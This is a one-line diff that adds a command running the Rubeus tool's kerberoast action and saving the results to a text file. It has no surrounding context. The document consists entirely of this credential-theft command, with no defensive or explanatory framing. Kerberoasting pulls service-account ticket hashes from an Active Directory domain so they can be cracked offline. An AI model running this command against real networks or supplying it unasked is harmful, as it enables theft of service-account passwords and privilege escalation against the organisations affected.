@@ -1,0 +1,1 @@
+Rubeus.exe kerberoast /outfile:kerberoast.txt
